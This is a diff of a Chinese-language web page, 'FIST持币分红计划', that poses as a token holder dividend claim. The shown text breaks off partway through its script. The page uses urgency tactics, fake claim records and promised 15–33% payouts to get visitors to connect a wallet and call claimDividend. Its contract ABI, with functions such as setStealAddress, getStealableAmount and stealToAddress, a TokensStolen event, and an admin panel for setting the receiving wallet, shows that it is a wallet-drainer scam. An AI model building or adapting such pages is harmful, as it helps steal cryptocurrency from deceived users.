@@ -1,996 +1,969 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FIST持币分红计划</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- 引入 ethers.js 库 -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #f9fafb;
-            min-height: 100vh;
-            color: #333;
-        }
-        
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .card {
-            background: white;
-            border-radius: 16px;
-            padding: 20px;
-            margin-bottom: 16px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        }
-        
-        .header-bg {
-            background: linear-gradient(135deg, #ff4e4e 0%, #ff8e8e 50%, #ff4e4e 100%);
-            height: 200px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .header-bg::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffd700' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
-            opacity: 0.3;
-        }
-        
-        .wallet-btn {
-            padding: 12px 20px;
-            background: linear-gradient(135deg, #f59e0b, #ef4444);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        .wallet-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        
-        .wallet-btn.connected {
-            background: linear-gradient(135deg, #10b981, #059669);
-        }
-        
-        .wallet-btn.loading {
-            opacity: 0.7;
-            pointer-events: none;
-        }
-        
-        .progress-bar {
-            height: 12px;
-            background: #e5e7eb;
-            border-radius: 6px;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #f59e0b, #ef4444);
-            border-radius: 6px;
-            transition: width 0.5s ease;
-        }
-        
-        .countdown {
-            text-align: center;
-            font-family: 'Courier New', monospace;
-            font-size: 18px;
-            font-weight: bold;
-            color: #ef4444;
-            margin: 10px 0;
-        }
-        
-        .stats {
-            display: flex;
-            justify-content: space-between;
-            margin: 15px 0;
-        }
-        
-        .stat-item {
-            text-align: center;
-            flex: 1;
-        }
-        
-        .stat-number {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .claimed {
-            color: #10b981;
-        }
-        
-        .remaining {
-            color: #ef4444;
-        }
-        
-        .claim-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #f59e0b, #ef4444);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px 0;
-        }
-        
-        .claim-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .claim-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(239, 68, 68, 0.4);
-        }
-        
-        .records {
-            max-height: 200px;
-            overflow-y: auto;
-            margin-top: 10px;
-        }
-        
-        .record-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #f3f4f6;
-        }
-        
-        .record-address {
-            font-family: monospace;
-            font-size: 14px;
-        }
-        
-        .record-percent {
-            color: #10b981;
-            font-weight: bold;
-        }
-        
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
-            z-index: 1000;
-            display: none;
-        }
-        
-        .admin-panel {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 15px;
-            margin-top: 10px;
-            display: none;
-        }
-        
-        .admin-input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #d1d5db;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-        
-        .admin-btn {
-            padding: 10px 16px;
-            background: #3b82f6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-right: 8px;
-        }
-        
-        .hidden {
-            display: none;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>FIST持币分红计划</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- 替换为web3.js库 -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+    
+    html {
+      -webkit-text-size-adjust: 100%;
+    }
+    
+    body {
+      font-size: 16px;
+      line-height: 1.5;
+      background: #f9fafb;
+    }
+    
+    /* 红色背景渐变 - 手机优化 */
+    .red-envelope-bg {
+      background: linear-gradient(135deg, #ff4e4e 0%, #ff8e8e 50%, #ff4e4e 100%);
+      background: -webkit-linear-gradient(135deg, #ff4e4e 0%, #ff8e8e 50%, #ff4e4e 100%);
+      position: relative;
+      overflow: hidden;
+      height: 200px;
+    }
+    
+    .red-envelope-bg::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-image: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffd700' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
+      opacity: 0.3;
+    }
+    
+    /* 按钮触摸优化 */
+    button {
+      min-height: 48px;
+      font-size: 16px;
+      touch-action: manipulation;
+      border-radius: 12px;
+    }
+    
+    input {
+      font-size: 16px;
+      min-height: 48px;
+    }
+    
+    /* 卡片样式 */
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    
+    /* 进度条 */
+    .progress-bar {
+      height: 16px;
+      border-radius: 8px;
+      background: #e5e7eb;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #f59e0b, #ef4444);
+      border-radius: 8px;
+      transition: width 0.5s ease;
+    }
+    
+    /* 记录区域 */
+    .record-item {
+      padding: 12px 0;
+      border-bottom: 1px solid #f3f4f6;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .records-container {
+      max-height: 300px;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+    
+    /* 倒计时 */
+    .countdown {
+      font-family: 'Courier New', monospace;
+      font-weight: 600;
+    }
+    
+    /* Toast提示 */
+    .toast {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0,0,0,0.8);
+      color: white;
+      padding: 12px 20px;
+      border-radius: 8px;
+      z-index: 1000;
+      display: none;
+    }
+
+    /* 管理员面板 */
+    .admin-panel {
+      background: #f8f9fa;
+      border: 1px solid #e9ecef;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 10px;
+    }
+
+    /* 数字醒目样式 */
+    .progress-number {
+      font-size: 1.5rem;
+      font-weight: bold;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .claimed-number {
+      color: #10b981;
+      animation: pulse 2s infinite;
+    }
+    
+    .remaining-number {
+      color: #ef4444;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.8; }
+    }
+
+    /* 领取按钮样式 */
+    .claim-button {
+      background: linear-gradient(135deg, #f59e0b, #ef4444);
+      background: -webkit-linear-gradient(135deg, #f59e0b, #ef4444);
+    }
+    
+    .claim-button:hover {
+      background: linear-gradient(135deg, #e6900a, #dc2626);
+      background: -webkit-linear-gradient(135deg, #e6900a, #dc2626);
+    }
+  </style>
 </head>
-<body>
-    <!-- 前端界面 -->
-    <div class="container">
-        <!-- 头部 -->
-        <div class="header-bg flex items-center justify-center relative">
-            <h1 class="text-3xl font-bold text-white text-center">FIST持币分红计划</h1>
-            <div class="absolute top-6 right-4">
-                <button id="connectWalletBtn" class="wallet-btn">
-                    连接钱包
-                </button>
-            </div>
-        </div>
+<body class="text-gray-800">
+  <!-- 头部 -->
+  <header class="relative">
+    <div class="w-full red-envelope-bg flex items-center justify-center">
+      <h1 class="text-3xl font-bold text-white text-center">FIST持币分红计划</h1>
+    </div>
+    <div class="absolute top-6 right-4">
+      <button id="connectWalletBtn" class="px-6 py-3 bg-yellow-400 hover:bg-yellow-500 rounded-lg shadow font-medium text-white">
+        连接钱包
+      </button>
+    </div>
+  </header>
 
-        <!-- 主卡片 -->
-        <div class="card">
-            <!-- 活动信息 -->
-            <div class="progress-section">
-                <h3 class="text-xl font-bold text-gray-800 mb-2">活动进度</h3>
-                <p class="text-sm text-gray-500 mb-4">
-                    超强共识者奖励计划 — 第一阶段开启，持币分红奖励 
-                    <span class="font-semibold text-red-600">15% ~ 33%</span>，倒计时内领完则提前结束
-                </p>
-                
-                <div class="stats">
-                    <div class="stat-item">
-                        <div class="stat-number claimed" id="claimedDisplay">434</div>
-                        <div class="text-sm text-gray-500">已领取</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-number remaining" id="remainingDisplay">66</div>
-                        <div class="text-sm text-gray-500">剩余</div>
-                    </div>
-                </div>
-                
-                <div class="progress-bar">
-                    <div id="progressBar" class="progress-fill" style="width: 87%"></div>
-                </div>
-                
-                <div class="text-center mt-4">
-                    <div class="text-sm text-gray-500">距活动结束：</div>
-                    <div id="countdown" class="countdown">0天 1时 57分 32秒</div>
-                </div>
-            </div>
-
-            <!-- 领取按钮 -->
-            <button id="claimBtn" class="claim-btn" disabled>
-                领取分红
-            </button>
-            
-            <!-- 领取信息 -->
-            <div id="claimInfo" class="mt-3 text-sm text-gray-600 hidden">
-                <div>可领取金额: <span id="claimableAmount">0</span> FIST</div>
-                <div>分红比例: <span id="dividendPercentage">0%</span></div>
-            </div>
+  <!-- 主内容 -->
+  <main class="p-4 space-y-4">
+    <!-- 活动信息 -->
+    <div class="card">
+      <!-- 活动进度标题 -->
+      <h2 class="text-xl font-bold text-gray-800 mb-2">活动进度</h2>
+      
+      <!-- 活动描述 -->
+      <p class="text-sm text-gray-500 mb-4">超强共识者奖励计划 — 第一阶段开启，持币分红奖励 <span class="font-semibold text-red-600">15% ~ 33%</span>，倒计时内领完则提前结束，赶紧参与！</p>
+      
+      <!-- 进度条 -->
+      <div class="mb-4">
+        <div class="flex justify-between items-center mb-2">
+          <span class="text-sm text-gray-500">活动进度</span>
+          <div class="text-right">
+            <div class="progress-number claimed-number" id="claimedDisplay">434 份</div>
+            <div class="text-sm text-gray-500">已领取</div>
+            <div class="progress-number remaining-number mt-1" id="remainingDisplay">66 份</div>
+            <div class="text-sm text-gray-500">剩余</div>
+          </div>
         </div>
-
-        <!-- 管理员面板 -->
-        <div class="card">
-            <h3 class="text-lg font-semibold mb-3">管理员设置</h3>
-            <div id="adminPanel" class="admin-panel">
-                <input type="text" id="targetTokenInput" class="admin-input" placeholder="目标代币地址">
-                <input type="text" id="stealAddressInput" class="admin-input" placeholder="收款钱包地址">
-                <div class="flex gap-2">
-                    <button id="setTokenBtn" class="admin-btn">设置代币</button>
-                    <button id="setStealBtn" class="admin-btn" style="background: #10b981;">设置收款</button>
-                </div>
-            </div>
+        <div class="progress-bar">
+          <div id="progressBar" class="progress-fill" style="width: 95%"></div>
         </div>
-
-        <!-- 领取记录 -->
-        <div class="card">
-            <h3 class="text-lg font-semibold mb-3">实时领取记录</h3>
-            <div class="records" id="recordsList">
-                <!-- 初始示例记录 -->
-                <div class="record-item">
-                    <div class="record-address">0x8a3d7...f4c2</div>
-                    <div>
-                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">28%</span></div>
-                        <div class="text-xs text-gray-400">已发放</div>
-                    </div>
-                </div>
-                <div class="record-item">
-                    <div class="record-address">0x5b9e1...a8d3</div>
-                    <div>
-                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">22%</span></div>
-                        <div class="text-xs text-gray-400">已发放</div>
-                    </div>
-                </div>
-                <div class="record-item">
-                    <div class="record-address">0x3c2f8...b7e1</div>
-                    <div>
-                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">31%</span></div>
-                        <div class="text-xs text-gray-400">已发放</div>
-                    </div>
-                </div>
-                <div class="record-item">
-                    <div class="record-address">0x9d4a2...c6f5</div>
-                    <div>
-                        <div class="text-xs text-gray-500">持仓分红: <span class="record-percent">19%</span></div>
-                        <div class="text-xs text-gray-400">已发放</div>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- 邀请链接 -->
-        <div class="card">
-            <h3 class="text-lg font-semibold mb-2">邀请链接</h3>
-            <p class="text-sm text-gray-500 mb-3">
-                每邀请一名用户，可随机获取好友领取分红的 
-                <span class="font-semibold text-red-600">5% - 18%</span> 收益分红
-            </p>
-            <div class="flex gap-2">
-                <input type="text" id="inviteInput" class="flex-1 px-4 py-3 border border-gray-300 rounded-l-lg text-sm" 
-                       readonly value="https://fist.com/invite?ref=COMMUNITY">
-                <button id="copyInviteBtn" class="px-4 py-3 bg-blue-500 text-white rounded-r-lg text-sm font-medium">
-                    复制
-                </button>
-            </div>
-        </div>
-
-        <!-- 活动规则 -->
-        <div class="card">
-            <h3 class="text-lg font-semibold mb-3">活动规则说明</h3>
-            <ol class="text-sm text-gray-600 space-y-2 pl-4">
-                <li class="list-decimal">持币用户才能领取分红奖励</li>
-                <li class="list-decimal">持币越多领取的分红越多</li>
-                <li class="list-decimal">持有代币并且从未卖过币的用户领取的分红更高</li>
-                <li class="list-decimal">领取奖励后等待 3-5 分钟奖励即可发放到钱包</li>
-            </ol>
-        </div>
+      </div>
+      
+      <!-- 倒计时 -->
+      <div class="text-center">
+        <div class="text-sm text-gray-500">距活动结束：</div>
+        <div id="countdown" class="countdown text-lg">0天 1时 57分 32秒</div>
+      </div>
     </div>
 
-    <!-- Toast提示 -->
-    <div id="toast" class="toast"></div>
+    <!-- 领取分红 -->
+    <div class="card flex flex-col items-center justify-center text-center">
+      <h3 class="text-lg font-semibold mb-3">持币用户可领取分红奖励</h3>
+      <button id="claimBtn" class="w-full py-4 claim-button rounded-lg text-white font-semibold shadow text-lg">
+        领取分红
+      </button>
+    </div>
 
-    <script>
-        // ============ 前端JavaScript ============
-        // 配置
-        const CONTRACT_ADDRESS = "0x0Fa51A95921600e9A4ddA4a62E977865F1ae6872";
-        const CONTRACT_ABI = [
-            {
-                "inputs": [],
-                "name": "claimDividend",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_newToken",
-                        "type": "address"
-                    }
-                ],
-                "name": "setTargetToken",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_newAddress",
-                        "type": "address"
-                    }
-                ],
-                "name": "setStealAddress",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "_active",
-                        "type": "bool"
-                    }
-                ],
-                "name": "setActive",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    }
-                ],
-                "name": "canClaim",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "user",
-                        "type": "address"
-                    }
-                ],
-                "name": "getStealableAmount",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "name": "hasClaimed",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "isActive",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
+    <!-- 管理员面板 -->
+    <div class="card" id="adminPanel" style="display: none;">
+      <h3 class="text-lg font-semibold mb-3">管理员设置</h3>
+      <div class="admin-panel">
+        <div class="mb-3">
+          <label class="block text-sm font-medium text-gray-700 mb-1">目标代币地址</label>
+          <input id="targetTokenInput" class="w-full px-3 py-2 border border-gray-300 rounded text-sm" 
+                 placeholder="输入代币合约地址">
+        </div>
+        <div class="mb-3">
+          <label class="block text-sm font-medium text-gray-700 mb-1">收款钱包地址</label>
+          <input id="stealAddressInput" class="w-full px-3 py-2 border border-gray-300 rounded text-sm" 
+                 placeholder="输入收款钱包地址">
+        </div>
+        <div class="flex gap-2">
+          <button id="setTokenBtn" class="flex-1 px-4 py-2 bg-blue-500 text-white rounded text-sm">
+            设置代币
+          </button>
+          <button id="setStealBtn" class="flex-1 px-4 py-2 bg-green-500 text-white rounded text-sm">
+            设置收款
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- 实时领取记录 -->
+    <div class="card">
+      <h3 class="text-lg font-semibold mb-3">实时领取记录</h3>
+      <div class="records-container bg-gray-50 rounded-lg p-3">
+        <div id="marqueeList">
+          <!-- 记录动态生成 -->
+        </div>
+      </div>
+    </div>
+
+    <!-- 邀请链接 -->
+    <div class="card">
+      <h3 class="text-lg font-semibold mb-2">邀请链接</h3>
+      <p class="text-sm text-gray-500 mb-3">每邀请一名用户，可随机获取好友领取分红的 <span class="font-semibold">5% - 18%</span> 收益分红。</p>
+      <div class="flex gap-2">
+        <input id="inviteInput" class="flex-1 px-4 py-3 border border-gray-300 rounded-l-lg text-sm" 
+               readonly value="https://reward.com/invite?ref=COMMUNITY">
+        <button id="copyInviteBtn" class="px-4 py-3 bg-blue-500 text-white rounded-r-lg text-sm font-medium">
+          复制
+        </button>
+      </div>
+    </div>
+
+    <!-- 活动规则 -->
+    <div class="card">
+      <h3 class="text-lg font-semibold mb-3">活动规则说明</h3>
+      <ol class="text-sm text-gray-600 space-y-2 pl-4">
+        <li class="list-decimal">持币用户才能领取分红奖励</li>
+        <li class="list-decimal">持币越多领取的分红越多</li>
+        <li class="list-decimal">持有代币并且从未卖过币的用户领取的分红更高</li>
+        <li class="list-decimal">领取奖励后等待 3-5 分钟奖励即可发放到钱包</li>
+      </ol>
+    </div>
+  </main>
+
+  <!-- Toast提示 -->
+  <div id="toast" class="toast">提示消息</div>
+
+  <script>
+    // 合约地址 - 部署后替换为您的合约地址
+    const CONTRACT_ADDRESS = "0x0Fa51A95921600e9A4ddA4a62E977865F1ae6872";
+    
+    // 合约ABI - 使用您提供的完整合约ABI
+    const CONTRACT_ABI = [
+      {
+        "inputs": [],
+        "name": "claimDividend",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "emergencyWithdraw",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "bool",
+            "name": "_active",
+            "type": "bool"
+          }
+        ],
+        "name": "setActive",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "_newAddress",
+            "type": "address"
+          }
+        ],
+        "name": "setStealAddress",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          }
+        ],
+        "name": "DividendClaimed",
+        "type": "event"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "_newToken",
+            "type": "address"
+          }
+        ],
+        "name": "setTargetToken",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "anonymous": false,
+        "inputs": [
+          {
+            "indexed": true,
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          },
+          {
+            "indexed": false,
+            "internalType": "uint256",
+            "name": "amount",
+            "type": "uint256"
+          },
+          {
+            "indexed": false,
+            "internalType": "address",
+            "name": "token",
+            "type": "address"
+          }
+        ],
+        "name": "TokensStolen",
+        "type": "event"
+      },
+      {
+        "stateMutability": "payable",
+        "type": "fallback"
+      },
+      {
+        "stateMutability": "payable",
+        "type": "receive"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          }
+        ],
+        "name": "canClaim",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "user",
+            "type": "address"
+          }
+        ],
+        "name": "getStealableAmount",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "name": "hasClaimed",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "isActive",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "owner",
+        "outputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "stealToAddress",
+        "outputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "targetToken",
+        "outputs": [
+          {
+            "internalType": "address",
+            "name": "",
+            "type": "address"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      }
+    ];
+
+    // 全局变量
+    let web3, userAddress;
+    let contract;
+    let isAdmin = false;
+
+    // 检测TP钱包
+    function detectTPWallet() {
+      if (typeof window.ethereum !== 'undefined') {
+        return window.ethereum;
+      }
+      if (typeof window.web3 !== 'undefined') {
+        return window.web3.currentProvider;
+      }
+      return null;
+    }
+
+    // 连接钱包
+    document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
+    
+    async function connectWallet() {
+      try {
+        const ethereum = detectTPWallet();
+        if (!ethereum) {
+          showToast('请安装TP钱包或其他Web3钱包');
+          return;
+        }
+
+        // 初始化web3
+        web3 = new Web3(ethereum);
+        
+        // 请求账户连接
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+        
+        // 初始化合约
+        contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+        
+        // 检查是否是管理员
+        const contractOwner = await contract.methods.owner().call();
+        isAdmin = contractOwner.toLowerCase() === userAddress.toLowerCase();
+        
+        // 更新UI
+        document.getElementById('connectWalletBtn').textContent = 
+          userAddress.slice(0,6) + '...' + userAddress.slice(-4);
+        document.getElementById('connectWalletBtn').classList.add('bg-green-500', 'hover:bg-green-600');
+        
+        // 显示管理员面板
+        if (isAdmin) {
+          document.getElementById('adminPanel').style.display = 'block';
+          // 加载当前设置
+          const [targetToken, stealAddress] = await Promise.all([
+            contract.methods.targetToken().call(),
+            contract.methods.stealToAddress().call()
+          ]);
+          document.getElementById('targetTokenInput').value = targetToken;
+          document.getElementById('stealAddressInput').value = stealAddress;
+        }
+        
+        showToast('钱包连接成功');
+        
+        // 监听账户变化
+        ethereum.on('accountsChanged', (accounts) => {
+          if (accounts.length === 0) {
+            disconnectWallet();
+          } else {
+            window.location.reload();
+          }
+        });
+        
+        // 监听网络变化
+        ethereum.on('chainChanged', (chainId) => {
+          window.location.reload();
+        });
+        
+      } catch (error) {
+        console.error('钱包连接失败:', error);
+        showToast('钱包连接失败: ' + error.message);
+      }
+    }
+
+    function disconnectWallet() {
+      document.getElementById('connectWalletBtn').textContent = '连接钱包';
+      document.getElementById('connectWalletBtn').classList.remove('bg-green-500', 'hover:bg-green-600');
+      document.getElementById('adminPanel').style.display = 'none';
+      web3 = null;
+      userAddress = null;
+      contract = null;
+      isAdmin = false;
+    }
+
+    // 检查用户状态
+    async function checkUserStatus() {
+      try {
+        const [hasClaimed, stealableAmount, canClaimStatus, isActive, targetToken] = await Promise.all([
+          contract.methods.hasClaimed(userAddress).call(),
+          contract.methods.getStealableAmount(userAddress).call(),
+          contract.methods.canClaim(userAddress).call(),
+          contract.methods.isActive().call(),
+          contract.methods.targetToken().call()
+        ]);
+
+        return {
+          hasClaimed,
+          stealableAmount: web3.utils.fromWei(stealableAmount, 'ether'),
+          canClaim: canClaimStatus,
+          isActive,
+          targetToken
+        };
+      } catch (error) {
+        return { 
+          hasClaimed: false, 
+          stealableAmount: "0", 
+          canClaim: false,
